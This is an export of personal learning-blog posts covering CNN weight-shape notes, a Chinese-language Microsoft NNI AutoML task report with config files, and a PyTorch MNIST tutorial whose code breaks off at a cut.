<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.csdn.net/as480133937/article/details/100138838">https://blog.csdn.net/as480133937/article/details/100138838</a></p>
<p><a href="https://blog.csdn.net/yexiaohhjk/article/details/82526604">https://blog.csdn.net/yexiaohhjk/article/details/82526604</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/34747279">https://zhuanlan.zhihu.com/p/34747279</a></p>
<p><a href="https://www.jianshu.com/p/70bf58c48010">https://www.jianshu.com/p/70bf58c48010</a></p>
]]></content>
      <tags>
        <tag>blog</tag>
      </tags>
  </entry>
  <entry>
    <title>Convolution Neural Network Learning Notes</title>
    <url>/2021/01/10/Convolution-Neural-Network-Learning-Notes/</url>
    <content><![CDATA[<p>when describing a “weights-bias”, we use four dimensions:</p>
<ol>
<li>the number of filters(euqal to the number of features to output)</li>
<li>the number of kernals(equal to the number of input channels; RGB: 3, gray: 1)</li>
<li>the first dimension of the kernal</li>
<li>the second dimension of the kernal</li>
</ol>
<p>a “weights-bias” consist of multiple filters plus a bias.</p>
<p>While using PyTorch, you can leave the first dimension -1, which means undecided, so that this number can be calculated with the help of the rest known dimension.</p>
]]></content>
      <tags>
        <tag>Deep-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>NNI Student Program 2020 Task1</title>
    <url>/2021/01/08/NNI-Student-Program-2020-Task1/</url>
    <content><![CDATA[<h1 id="Task-1-入门任务"><a href="#Task-1-入门任务" class="headerlink" title="Task 1 入门任务"></a>Task 1 入门任务</h1><h2 id="NNI-体验文档"><a href="#NNI-体验文档" class="headerlink" title="NNI 体验文档"></a>NNI 体验文档</h2><h3 id="1-AutoML-工具比较"><a href="#1-AutoML-工具比较" class="headerlink" title="1. AutoML 工具比较"></a>1. AutoML 工具比较</h3><p>机器学习算法与模型的选择，对机器学习十分重要，一个成功的选择，能够成倍提高训练效率，从而提高模型准确度，减少损失，产生更大的效益。</p>
<p>但算法与模型的选择并不简单。就算是数据科学家，也需要花费大量的时间用于尝试与权衡不同模型的优劣，最终才能得出理想的结果。超参的调参过程中也经常造成算力的浪费。</p>
<p>自动机器学习（AutoML）是一套自动化的机器学习应用工具，旨在用自动化工具完成特征工程、自动调参等优化工作。</p>
<p>当前，自动机器学习平台早已问世，下面介绍几个著名的AutoML工具，并列出优缺点，以供比较。</p>
<h4 id="auto-sklearn"><a href="#auto-sklearn" class="headerlink" title="auto-sklearn"></a>auto-sklearn</h4><p>auto-sklearn是GitHub上开源的一个基于sklearn的自动机器学习工具，目前已获得5.1k个星。</p>
<p>优点：可限制训练时间，支持切分训练集和测试集，支持交叉验证。</p>
<p>缺点：输出信息较少，优化算法单一。</p>
<h4 id="Google-Cloud-AutoML"><a href="#Google-Cloud-AutoML" class="headerlink" title="Google Cloud AutoML"></a>Google Cloud AutoML</h4><p>Google Cloud AutoML基于高精度的深度神经网络而设计，可用于图像分类、自然语言处理、语音翻译等。</p>
<p>优点：具有较完整的谷歌ML生态链，Tensorflow+Colab+Cloud AutoML共同使用时非常方便。</p>
<p>优点：具有完整图形界面，对新手用户友好，同时提供API调用，分类详尽。</p>
<p>缺点：完整版需付费，访问需科学上网。</p>
<h4 id="Microsoft-NNI"><a href="#Microsoft-NNI" class="headerlink" title="Microsoft NNI"></a>Microsoft NNI</h4><p>NNI(Neural Network Intelligence)是微软亚洲研究院开源的自动机器学习工具，面向研究人员和算法工程师而设计，2018年9月问世，目前已经更新至v1.9。</p>
<p>优点：具有多平台支持，可命令行操作，支持结果可视化。内置优化算法多，扩展性强，支持远程调用进行集群训练。</p>
<p>缺点：暂未发现</p>
<p>更详细的对比：</p>
<p><img data-src="https://www.msra.cn/wp-content/uploads/2019/12/nni-2.png" alt></p>
<p>（摘自MSRA官网）</p>
<h3 id="2-NNI-安装及使用"><a href="#2-NNI-安装及使用" class="headerlink" title="2. NNI 安装及使用"></a>2. NNI 安装及使用</h3><p>NNI的安装非常简单，只需一行命令即可安装：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ pip install --upgrade nni</span><br></pre></td></tr></table></figure>
<p>本人强烈推荐将nni安装在Anaconda的环境中，可通过在PyCharm中设置Python解释器，实现对NNI的调用。</p>
<p>使用NNI，需要在原有神经网络代码的基础上做出些许修改：</p>
<ol>
<li>通过nni模块获得参数</li>
<li>向nni报告中间结果</li>
<li>向nni报告最终结果</li>
</ol>
<p>修改好代码并且准备好搜索空间和配置文件后，就可以通过一行命令开始使用NNI：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nnictl create --config your-config.yml</span><br></pre></td></tr></table></figure>
<p>具体会在下述代码部分进行解释。</p>
<h3 id="3-NNI-使用感受"><a href="#3-NNI-使用感受" class="headerlink" title="3. NNI 使用感受"></a>3. NNI 使用感受</h3><p>NNI易于安装，易于使用，有一套完善的命令行控制工具，也有结果可视化界面，对机器学习实验与研究提供了巨大的便利。</p>
<p>本人大一，尚未接触过多机器学习知识，但通过在本地跑通多个样例后，能感受到NNI在机器学习方面的威力，希望未来能够掌握NNI，方便未来的研究与学习。</p>
<h2 id="NNI-样例分析文档"><a href="#NNI-样例分析文档" class="headerlink" title="NNI 样例分析文档"></a>NNI 样例分析文档</h2><h3 id="配置文件：config-windows-yml"><a href="#配置文件：config-windows-yml" class="headerlink" title="配置文件：config_windows.yml"></a>配置文件：config_windows.yml</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">authorName: default</span><br><span class="line">experimentName: example_mnist_pytorch</span><br><span class="line">trialConcurrency: 1</span><br><span class="line">maxExecDuration: 2h</span><br><span class="line">maxTrialNum: 10</span><br><span class="line">#choice: local, remote, pai</span><br><span class="line">trainingServicePlatform: local</span><br><span class="line">searchSpacePath: search_space.json</span><br><span class="line">#choice: true, false</span><br><span class="line">useAnnotation: false</span><br><span class="line">tuner:</span><br><span class="line">  #choice: TPE, Random, Anneal, Evolution, BatchTuner, MetisTuner, GPTuner</span><br><span class="line">  #SMAC (SMAC should be installed through nnictl)</span><br><span class="line">  builtinTunerName: TPE</span><br><span class="line">  classArgs:</span><br><span class="line">    #choice: maximize, minimize</span><br><span class="line">    optimize_mode: maximize</span><br><span class="line">trial:</span><br><span class="line">  command: python mnist.py</span><br><span class="line">  codeDir: .</span><br><span class="line">  gpuNum: 0</span><br></pre></td></tr></table></figure>
<h3 id="搜索空间：search-space-json"><a href="#搜索空间：search-space-json" class="headerlink" title="搜索空间：search_space.json"></a>搜索空间：search_space.json</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;batch_size&quot;</span>: &#123;<span class="attr">&quot;_type&quot;</span>:<span class="string">&quot;choice&quot;</span>, <span class="attr">&quot;_value&quot;</span>: [<span class="number">16</span>, <span class="number">32</span>, <span class="number">64</span>, <span class="number">128</span>]&#125;,</span><br><span class="line">    <span class="attr">&quot;hidden_size&quot;</span>:&#123;<span class="attr">&quot;_type&quot;</span>:<span class="string">&quot;choice&quot;</span>,<span class="attr">&quot;_value&quot;</span>:[<span class="number">128</span>, <span class="number">256</span>, <span class="number">512</span>, <span class="number">1024</span>]&#125;,</span><br><span class="line">    <span class="attr">&quot;lr&quot;</span>:&#123;<span class="attr">&quot;_type&quot;</span>:<span class="string">&quot;choice&quot;</span>,<span class="attr">&quot;_value&quot;</span>:[<span class="number">0.0001</span>, <span class="number">0.001</span>, <span class="number">0.01</span>, <span class="number">0.1</span>]&#125;,</span><br><span class="line">    <span class="attr">&quot;momentum&quot;</span>:&#123;<span class="attr">&quot;_type&quot;</span>:<span class="string">&quot;uniform&quot;</span>,<span class="attr">&quot;_value&quot;</span>:[<span class="number">0</span>, <span class="number">1</span>]&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>代码部分只需要在原有PyTorch代码上进行些许修改。</p>
<ol>
<li>参数选择无需在程序中给定，而是通过nni获得：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tuner_params = nni.get_next_parameter()</span><br></pre></td></tr></table></figure></li>
<li>在每个epoch学习完成后，报告中间结果：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nni.report_intermediate_result(test_acc)</span><br></pre></td></tr></table></figure></li>
<li>在训练完整结束后，报告最终结果：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nni.report_final_result(test_acc)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><p>如图，10次trial都成功地完成，其中id为9的trial达到了最高准确率，达99.34%。</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/NNI-Student-Program-2020-Task1/1.png">

<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/NNI-Student-Program-2020-Task1/4.png">

<h4 id="超参组合可视化"><a href="#超参组合可视化" class="headerlink" title="超参组合可视化"></a>超参组合可视化</h4><img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/NNI-Student-Program-2020-Task1/5.png">

<p>图中，准确率更高的组合用红线表示，而准确率低的用绿线表示。</p>
<p>可以看出，当batch_size选择16，lr和momentum大小适中时，模型可以达到99%以上的准确率，实验效果非常理想。</p>
<h4 id="训练结果可视化"><a href="#训练结果可视化" class="headerlink" title="训练结果可视化"></a>训练结果可视化</h4><img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/NNI-Student-Program-2020-Task1/3.png">

<p>Default Metric</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/NNI-Student-Program-2020-Task1/2.png">

<p>Sorted Default Metric</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/NNI-Student-Program-2020-Task1/6.png">

<p>Trial Duration</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/NNI-Student-Program-2020-Task1/7.png">

<p>Intermediate Results</p>
]]></content>
      <tags>
        <tag>NNI</tag>
      </tags>
  </entry>
  <entry>
    <title>Learn MNIST in PyTorch from Scratch to CNN</title>
    <url>/2021/01/11/Learn-MNIST-in-PyTorch-from-Scratch-to-CNN/</url>
    <content><![CDATA[<p>Today I spent nearly an afternoon to follow the tutorial on <a href="pytorch.org">pytorch.org</a>. So just recall what I have learnt here.</p>
<p>(all in PyTorch…)</p>
<h2 id="from-Scratch"><a href="#from-Scratch" class="headerlink" title="from Scratch"></a>from Scratch</h2><p>We first write our code without too many features of PyTorch so that we can gradually see what can be simplified when using PyTorch.</p>
<h3 id="Download-MNIST-Data"><a href="#Download-MNIST-Data" class="headerlink" title="Download MNIST Data"></a>Download MNIST Data</h3><p>data download link: <a href="https://github.com/pytorch/tutorials/raw/master/_static/mnist.pkl.gz">https://github.com/pytorch/tutorials/raw/master/_static/mnist.pkl.gz</a></p>
<p>After manually decompressing this file, we use <code>pickle</code> to read data.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_data</span>():</span></span><br><span class="line">    path = Path(<span class="string">&#x27;data/mnist/mnist.pkl&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> path.exists():</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data/mnist/mnist.pkl&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            (XTrain, YTrain), (XTest, YTest), _ = pickle.load(f, encoding=<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> XTrain, YTrain, XTest, YTest</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(FileNotFoundError)</span><br></pre></td></tr></table></figure>
<p>It’s worth mentioning that the second dimension of <code>XTrain</code> and <code>XTest</code> are 784, which is identical to 28 * 28.</p>
<p>Using <code>plt.imshow</code> and <code>plt.show</code> function, single data can be shown easily.</p>
<p>Here is the initial code implementing MNIST with few feature of PyTorch:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_data</span>():</span></span><br><span class="line">    path = Path(<span class="string">&#x27;data/mnist/mnist.pkl&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> path.exists():</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data/mnist/mnist.pkl&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            (XTrain, YTrain), (XTest, YTest), _ = pickle.load(f, encoding=<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> XTrain, YTrain, XTest, YTest</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(FileNotFoundError)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">draw</span>(<span class="params">X</span>):</span></span><br><span class="line">    print(X.shape)</span><br><span class="line">    plt.imshow(X.reshape((<span class="number">28</span>, <span class="number">28</span>)), cmap=<span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">    plt.show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log_softmax</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x - x.exp().<span class="built_in">sum</span>(-<span class="number">1</span>).log().unsqueeze(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">X</span>):</span></span><br><span class="line">    <span class="keyword">return</span> log_softmax(X @ weights + bias)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nll</span>(<span class="params">batch_z, batch_y</span>):</span></span><br><span class="line">    <span class="keyword">return</span> -batch_z[<span class="built_in">range</span>(batch_y.shape[<span class="number">0</span>]), batch_y].mean()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">loss_func = nll</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">accuracy</span>(<span class="params">batch_z, batch_y</span>):</span></span><br><span class="line">    temp = torch.argmax(batch_z, dim=<span class="number">1</span>)</span><br><span class="line">    r = (temp == batch_y)</span><br><span class="line">    <span class="keyword">return</span> r.<span class="built_in">float</span>().mean()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_batch_train_data</span>(<span class="params">batch_size, iteration</span>):</span></span><br><span class="line">    start = batch_size * iteration</span><br><span class="line">    end = start + iteration</span><br><span class="line">    <span class="keyword">return</span> XTrain[start:end], YTrain[start:end]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_batch_test_data</span>(<span class="params">batch_size, iteration</span>):</span></span><br><span class="line">    start = batch_size * iteration</span><br><span class="line">    end = start + iteration</span><br><span class="line">    <span class="keyword">return</span> XTest[start:end], YTest[start:end]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">XTrain, YTrain, XTest, YTest = read_data()  <span class="comment"># train: 50000, test: 10000</span></span><br><span class="line">XTrain, YTrain, XTest, YTest = <span class="built_in">map</span>(torch.tensor, (XTrain, YTrain, XTest, YTest))</span><br><span class="line"></span><br><span class="line">weights = torch.randn(<span class="number">784</span>, <span class="number">10</span>) / math.sqrt(<span class="number">784</span>)</span><br><span class="line">weights.requires_grad_()</span><br><span class="line">bias = torch.zeros(<span class="number">10</span>, requires_grad=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span>(<span class="params">max_epoch, max_iteration, batch_size, lr</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;training...&#x27;</span>)</span><br><span class="line">    <span class="keyword">global</span> weights, bias</span><br><span class="line">    <span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(max_epoch):</span><br><span class="line">        <span class="keyword">for</span> iteration <span class="keyword">in</span> <span class="built_in">range</span>(max_iteration):</span><br><span class="line">            start = iteration * batch_size</span><br><span class="line">            end = start + batch_size</span><br><span class="line">            batch_x, batch_y = get_batch_train_data(batch_size, iteration)</span><br><span class="line">            batch_z = forward(batch_x)</span><br><span class="line">            loss = loss_func(batch_z, batch_y)</span><br><span class="line"></span><br><span class="line">            loss.backward()</span><br><span class="line">            <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">                weights -= lr * weights.grad</span><br><span class="line">                bias -= lr * bias.grad</span><br><span class="line">                weights.grad.zero_()</span><br><span class="line">                bias.grad.zero_()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;training done.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;testing...&#x27;</span>)</span><br><span class="line">    ZTest = forward(XTest)</span><br><span class="line">    print(<span class="string">&#x27;loss=%.4f, accuracy=%.4f&#x27;</span> % (loss_func(ZTest, YTest), accuracy(ZTest, YTest)))</span><br><span class="line">    print(<span class="string">&#x27;testing done.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    num_train = XTrain.shape[<span class="number">0</span>]</span><br><span class="line">    num_test = XTest.shape[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># batch_x = XTrain[:batch_size]</span></span><br><span class="line">    <span class="comment"># batch_z = forward(batch_x)</span></span><br><span class="line">    <span class="comment"># print(batch_z[0], batch_z.shape)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># batch_y = YTrain[:batch_size]</span></span><br><span class="line">    <span class="comment"># print(loss_func(batch_z, batch_y))</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># print(accuracy(batch_z, batch_y))</span></span><br><span class="line"></span><br><span class="line">    batch_size = <span class="number">64</span></span><br><span class="line">    lr = <span class="number">0.05</span></span><br><span class="line">    max_epoch = <span class="number">20</span></span><br><span class="line">    max_iteration = math.ceil(num_train / batch_size)</span><br><span class="line">    train(max_epoch, max_iteration, batch_size, lr)</span><br><span class="line">    test()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Most of the details can be answered if you have learnt about the basic knowledge of neural network, and most of the procedures are very similar to <a href="github.com/microsoft/ai-edu">the tutorial I learn</a>.</p>
<p>Now the magic just begins.</p>
<h2 id="Where-can-be-simplified-using-PyTorch-feature"><a href="#Where-can-be-simplified-using-PyTorch-feature" class="headerlink" title="Where can be simplified using PyTorch feature?"></a>Where can be simplified using PyTorch feature?</h2><h3 id="choosing-from-torch-nn-functional"><a href="#choosing-from-torch-nn-functional" class="headerlink" title="choosing from torch.nn.functional"></a>choosing from torch.nn.functional</h3><p>In previous code, we must manually define a function <code>nll</code> for calculating loss, which can be replaced by <code>torch.nn.functional</code>.</p>
<p>This stuff contains lots of functions, so that we needn’t implement each function we use, which is quite convenient.</p>
<h2 id="extending-torch-nn-Module"><a href="#extending-torch-nn-Module" class="headerlink" title="extending torch.nn.Module"></a>extending torch.nn.Module</h2><p>we can define our whole neural network as a class, whose super class is <code>torch.nn.Module</code>. In this way, parameters can be stored inside this object, which is friendly for us to program.</p>
<h2 id="using-layer-objects-from-torch-nn"><a href="#using-layer-objects-from-torch-nn" class="headerlink" title="using layer objects from torch.nn"></a>using layer objects from torch.nn</h2><p>The model previous code uses is exactly a linear layer, which can be replaced by <code>torch.nn.Linear</code>, which contains parameters within it.</p>
<p>What’s more, pooling layer, convolution layer are also available to use in <code>torch.nn</code>, which greatly reduces workflow.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">loss_func = F.cross_entropy</span><br><span class="line">model = NeuralNet() <span class="comment"># I am hanhan!</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span>(<span class="params">max_epoch, max_iteration, batch_size, lr</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;training...&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(max_epoch):</span><br><span class="line">        <span class="keyword">for</span> iteration <span class="keyword">in</span> <span class="built_in">range</span>(max_iteration):</span><br><span class="line">            batch_x, batch_y = get_batch_train_data(batch_size, iteration)</span><br><span class="line">            batch_z = model(batch_x)</span><br><span class="line">            loss = loss_func(batch_z, batch_y)</span><br><span class="line"></span><br><span class="line">            loss.backward()</span><br><span class="line">            <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">                <span class="keyword">for</span> p <span class="keyword">in</span> model.parameters():</span><br><span class="line">                    p -= p.grad * lr</span><br><span class="line">                model.zero_grad()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;training done.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;testing...&#x27;</span>)</span><br><span class="line">    ZTest = model(XTest)</span><br><span class="line">    print(<span class="string">&#x27;loss=%.4f, accuracy=%.4f&#x27;</span> % (loss_func(ZTest, YTest), accuracy(ZTest, YTest)))</span><br><span class="line">    print(<span class="string">&#x27;testing done.&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="modifying-parameters-by-torch-optim"><a href="#modifying-parameters-by-torch-optim" class="headerlink" title="modifying parameters by torch.optim"></a>modifying parameters by torch.optim</h2><p><code>torch.optim</code> includes many methods of optimization, including most commonly-used SGD. With this tool, we needn’t traverse all parameters and subtract its specific value from itself, but only write two lines of code:</p>
<p>Before:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> torch.no_grad():</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> model.parameters():</span><br><span class="line">        p -= p.grad * lr</span><br><span class="line">    model.zero_grad()</span><br></pre></td></tr></table></figure><br>After:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> torch.no_grad():</span><br><span class="line">    optimizer.step()</span><br><span class="line">    optimizer.zero_grad()</span><br></pre></td></tr></table></figure><br>Remember to zero grad after each epoch is done, otherwise the gradients will become way too large and get unexpected results.</p>
<p>btw, why I comment that I am hanhan? Because I made mistake on <code>model</code>. Here <code>model</code> must be an instance of <code>NeuralNet</code> rather than a alias, for the values of weights are random. Otherwise, your loss value will always get above 2…</p>
<h3 id="loading-dataset-and-dataloader"><a href="#loading-dataset-and-dataloader" class="headerlink" title="loading dataset and dataloader"></a>loading dataset and dataloader</h3><p>How to import?</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> TensorDataset, DataLoader</span><br></pre></td></tr></table></figure>
<p>How to declare?<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">train_set = TensorDataset(XTrain, YTrain)</span><br><span class="line">train_loader = DataLoader(train_set, batch_size=bs, shuffle=<span class="literal">True</span>)</span><br><span class="line">valid_set = TensorDataset(XValid, YValid)</span><br><span class="line">valid_loader = DataLoader(valid_set, batch_size=bs * <span class="number">2</span>, shuffle=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><br>Where is the validation set? I just generate the validation set by extracting one tenth of data of training set. This trick is learnt from “microsoft/ai-edu”.</p>
<p>Since we have things prepared, the whole training code is simple:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;training...&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(max_epoch):</span><br><span class="line">        model.train() <span class="comment"># written before training</span></span><br><span class="line">        <span class="keyword">for</span> batch_x, batch_y <span class="keyword">in</span> train_loader: <span class="comment"># traversal simplified</span></span><br><span class="line">            batch_z = model(batch_x)</span><br><span class="line">            loss = loss_func(batch_z, batch_y)</span><br><span class="line">            loss.backward()</span><br><span class="line">            optimizer.step()</span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">        model.<span class="built_in">eval</span>() <span class="comment"># written before validating</span></span><br><span class="line">        <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">            valid_loss = <span class="built_in">sum</span>(loss_func(model(batch_x), batch_y) <span class="keyword">for</span> batch_x, batch_y <span class="keyword">in</span> valid_loader) / num_valid</span><br><span class="line">        print(<span class="string">&quot;epoch %d, validation loss=%.4f&quot;</span> % (epoch, valid_loss))</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;training done.&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="Switch-to-CNN"><a href="#Switch-to-CNN" class="headerlink" title="Switch to CNN"></a>Switch to CNN</h2><p>CNN is widely used when data is images. Now let’s try to solve MNIST with CNN, just to feel how powerful CNN is.</p>
<p>In fact, most of the code remain the same. The only area we need to modify is in the definition of class, replacing linear layer with more complex layers.</p>
<p>Here is the code:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn, optim</span><br><span class="line"><span class="keyword">from</span> torch.nn <span class="keyword">import</span> functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> TensorDataset, DataLoader</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># class MNIST(nn.Module):</span></span><br><span class="line"><span class="comment">#     def __init__(self):</span></span><br><span class="line"><span class="comment">#         super(MNIST, self).__init__()</span></span><br><span class="line"><span class="comment">#         self.conv1 = nn.Conv2d(1, 16, kernel_size=3, stride=2, padding=1)</span></span><br><span class="line"><span class="comment">#         self.conv2 = nn.Conv2d(16, 16, kernel_size=3, stride=2, padding=1)</span></span><br><span class="line"><span class="comment">#         self.conv3 = nn.Conv2d(16, 10, kernel_size=3, stride=2, padding=1)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     def forward(self, batch_x):</span></span><br><span class="line"><span class="comment">#         batch_x = batch_x.view(-1, 1, 28, 28)</span></span><br><span class="line"><span class="comment">#         batch_x = F.relu(self.conv1(batch_x))</span></span><br><span class="line"><span class="comment">#         batch_x = F.relu(self.conv2(batch_x))</span></span><br><span class="line"><span class="comment">#         batch_x = F.relu(self.conv3(batch_x))</span></span><br><span class="line"><span class="comment">#         batch_x = F.avg_pool2d(batch_x, 4)</span></span><br><span class="line"><span class="comment">#         return batch_x.view(-1, batch_x.size(1))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">draw</span>(<span class="params">X</span>):</span></span><br><span class="line">    print(X.shape)</span><br><span class="line">    plt.imshow(X.reshape((<span class="number">28</span>, <span class="number">28</span>)), cmap=<span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">    plt.show()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_data</span>():</span></span><br><span class="line">    path = Path(<span class="string">&#x27;data/mnist/mnist.pkl&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> path.exists():</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data/mnist/mnist.pkl&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            (XTrain, YTrain), (XTest, YTest), _ = pickle.load(f, encoding=<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> XTrain, YTrain, XTest, YTest</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(FileNotFoundError)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_validation_set</span>(<span class="params">k=<span class="number">10</span></span>):</span></span><br><span class="line">    <span class="keyword">global</span> num_train, XTrain, YTrain</span><br><span class="line">    num_valid = num_train // k</span><br><span class="line">    num_train -= num_valid</span><br><span class="line">    XValid, YValid = XTrain[:num_valid], YTrain[:num_valid]</span><br><span class="line">    XTrain, YTrain = XTrain[num_valid:], YTrain[num_valid:]</span><br><span class="line">    <span class="keyword">return</span> XValid, YValid, num_valid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">XTrain, YTrain, XTest, YTest = read_data()  <span class="comment"># train: 50000, test: 10000</span></span><br><span class="line">num_train = XTrain.shape[<span class="number">0</span>]</span><br><span class="line">num_test = XTest.shape[<span class="number">0</span>]</span><br><span class="line">XValid, YValid, num_valid = generate_validation_set(k=<span 